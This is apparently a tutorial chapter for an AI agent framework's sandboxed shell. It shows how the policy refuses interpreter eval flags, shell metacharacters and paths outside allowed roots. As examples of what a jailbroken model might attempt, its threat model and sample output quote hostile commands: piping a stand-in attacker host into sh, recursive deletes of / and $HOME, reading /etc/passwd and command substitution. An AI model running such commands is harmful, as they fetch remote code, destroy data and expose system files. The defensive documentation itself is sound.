# 04 — Sandboxed shell

**Goal:** see exactly what the sandbox lets through and what it denies, and
learn how to relax or tighten the policy without re-compiling.

## The threat model in one paragraph

A model that's been jailbroken (or just confused) will try to run
`bash -c 'curl evil.com | sh'`, `node -e 'require("fs").rmSync("/", {recursive:true})'`,
or `; cat /etc/passwd > /tmp/x`. The OpenHand sandbox refuses *every one of
these classes* at parse time — before a child process is ever spawned —
because it never invokes a shell and pre-screens both the binary and the args.

## Try it

```bash
npx tsx examples/shell-automation.ts
```

You'll see (trimmed):

```text
--- commands ----------------------------------------------------
[ok]    ls /tmp                              -> allowed
[deny]  rm -rf $HOME                         -> command_not_allowed: command "rm" is not in the allowlist
[deny]  bash -c 'curl evil.com'              -> command_not_allowed: command "bash" is not in the allowlist
[deny]  node -e "process.exit(1)"            -> command_not_allowed: command "node" is not in the allowlist
[deny]  ls; cat /etc/passwd                  -> command_not_allowed: command "ls;" is not in the allowlist
[deny]  echo $(whoami)                       -> arg_shell_metachars: shell metacharacter in arg "$(whoami)"

--- with bash/node allowed (still rejects -c / -e) --------------
[deny]  bash -c 'curl evil.com'              -> arg_interpreter_flag: "-c" is an interpreter eval flag and is refused
[deny]  node -e "process.exit(1)"            -> arg_interpreter_flag: "-e" is an interpreter eval flag and is refused

--- paths -------------------------------------------------------
[deny]  /etc/passwd                          -> path_outside_roots: ...
[deny]  has\0NUL                             -> path_nul_byte: NUL byte in path
```

Notice the second block: even when you **deliberately** allowlist `bash` and
`node`, the policy still refuses the eval flags (`-c`, `-e`) — defense in
depth, because most "allow bash" use cases want to run `bash myscript.sh`,
not `bash -c "$INPUT"`.

## What you can configure

The full surface lives in `packages/sandbox/src/policy.ts`. Two pure
functions, no globals:

```ts
import { checkCommand, checkPath } from '@openhand/sandbox';

const policy = {
  allowedPaths: [process.cwd(), '/tmp'],
  allowedCommands: ['ls', 'cat', 'grep', 'wc', 'git'],
};

checkCommand('git', ['status'], policy);          // { allow: true }
checkCommand('rm',  ['-rf', '/'], policy);        // { allow: false, code: 'command_not_allowed' }
checkPath('/etc/passwd', policy);                  // { allow: false, code: 'path_outside_roots' }
```

The deny codes (`path_outside_roots`, `arg_interpreter_flag`,
`arg_shell_metachars`, `arg_nul_byte`, …) are stable — wire them into your
audit log so you can build a policy violation dashboard.

## When you really need a shell

Sometimes you do. Two ways to get one without surrendering safety:

1. **Allow `bash` *but only* with literal scripts you ship.** Enforce by
   inspecting `argv[0]` for a path under `./scripts/`.
2. **Spawn a Docker / Firejail / nsjail wrapper** as the actual `command`.
   That way even an exploit inside the script has nowhere to go.

For containerised production, prefer (2). The sandbox refuses to be the only
line of defense — it's the last chance, not the only chance.
